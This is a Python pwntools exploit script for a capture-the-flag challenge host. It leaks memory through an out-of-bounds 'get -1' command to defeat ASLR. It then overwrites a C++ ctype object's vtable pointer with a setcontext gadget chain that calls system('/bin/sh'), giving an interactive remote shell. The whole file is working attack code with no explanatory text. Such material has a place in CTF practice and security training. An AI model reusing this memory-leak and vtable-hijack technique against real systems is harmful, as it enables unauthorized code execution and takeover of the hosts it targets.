#!/usr/bin/env python3
from pwn import *

HOST = "string-peek-and-poke-dcba52aa2c03.inst17.ctf.fortid.com"
PORT = 1337

context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libc-2.39.so", checksec=False)
context.log_level = "debug"

BAD = set(b" \t\n\r\v\f")

LIBSTD_CTYPE_VPTR_OFF = 0x26fe98
LIBSTD_CTYPE_OBJ_OFF  = 0x27ba20
LIBC_NL_C_LOCOBJ_OFF  = 0x202de0

def has_bad(x):
    return any(c in BAD for c in x)

def pick_offsets(ctype, system, setcontext):
    for vt in range(0x280, 0x700, 8):
        for binsh in range(0x700, 0xa00, 8):
            for fp in range(0xa00, 0xd00, 8):
                for st in range(0xd00, 0x1300, 8):
                    ptrs = [
                        ctype + vt,
                        ctype + binsh,
                        ctype + fp,
                        ctype + st,
                        system,
                        setcontext,
                    ]
                    if all(not has_bad(p64(p)) for p in ptrs):
                        return vt, binsh, fp, st
    raise Exception("bad ASLR bytes, reconnect")

def build_payload(leak, ctype, system, setcontext):
    vt_off, binsh_off, fp_off, st_off = pick_offsets(
        ctype, system, setcontext
    )

    size = max(vt_off + 0x100, binsh_off + 8, fp_off + 0x40, st_off + 0x40, 0x1c8)
    p = bytearray(b"\x00" * (size + 0x20))

    fake_vtable = ctype + vt_off
    binsh       = ctype + binsh_off
    fpstate     = ctype + fp_off
    fake_stack  = ctype + st_off

    # Preserve ctype internals needed by parser.
    p[0x08:0x38] = leak[0x08:0x38]

    # Hijack ctype vptr.
    p[0x00:0x08] = p64(fake_vtable)
    p[0x38] = 0

    # setcontext(ctype)
    p[0x68:0x70] = p64(binsh)       # rdi
    p[0xa0:0xa8] = p64(fake_stack)  # rsp
    p[0xa8:0xb0] = p64(system)      # rip
    p[0xe0:0xe8] = p64(fpstate)     # fpstate
    p[0x1c0:0x1c4] = p32(0x1f80)    # mxcsr

    # Fill many vtable slots with setcontext.
    for off in range(0, 0x100, 8):
        p[vt_off + off:vt_off + off + 8] = p64(setcontext)

    p[binsh_off:binsh_off + 8] = b"/bin/sh\x00"

    assert not has_bad(p), "payload contains whitespace"
    return bytes(p)

def main():
    io = remote(HOST, PORT, ssl=True, sni=HOST) if args.REMOTE else process("./chall")

    io.recvuntil(b"> ")

    # Dead-looking leak, but process is still alive. cout just loses prompt after this.
    io.sendline(b"get -1")
    leak = io.recvn(0x1000)

    ctype_vptr = u64(leak[0x00:0x08])
    libc_leak  = u64(leak[0x10:0x18])

    libstd_base = ctype_vptr - LIBSTD_CTYPE_VPTR_OFF
    libc.address = libc_leak - LIBC_NL_C_LOCOBJ_OFF

    ctype = libstd_base + LIBSTD_CTYPE_OBJ_OFF
    system = libc.sym["system"]
    setcontext = libc.sym["setcontext"]

    log.success(f"libstd base = {hex(libstd_base)}")
    log.success(f"libc base   = {hex(libc.address)}")
    log.info(f"ctype       = {hex(ctype)}")
    log.info(f"system      = {hex(system)}")
    log.info(f"setcontext  = {hex(setcontext)}")

    payload = build_payload(leak, ctype, system, setcontext)

    # Do NOT wait for "> " anymore. cout is broken after the giant leak.
    io.sendline(b"put -1 " + payload)

    # Trigger ctype virtual call.
    io.sendline(b"x")

    io.interactive()

if __name__ == "__main__":
    main()